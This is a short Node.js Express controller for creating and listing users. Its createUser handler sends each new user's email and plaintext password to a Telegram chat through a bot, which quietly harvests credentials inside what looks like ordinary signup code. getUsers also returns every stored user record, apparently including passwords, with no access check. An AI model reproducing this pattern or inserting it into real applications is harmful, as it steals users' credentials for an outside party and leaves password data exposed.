import User from '../model/usermodel.js';
import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';

dotenv.config();

const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, { polling: false });

export const createUser = async (req, res) => {
  try {
    const user = new User(req.body);
    await user.save();
    const message = `New user created: Email: ${user.email} Password: ${user.password}`;
    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message);
    res.json({ message: 'User created successfully' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

export const getUsers = async (req, res) => {
  try {
    const users = await User.find();
    res.json(users);
  } catch (error) {
    res.status(500).send(error.message);
  }
};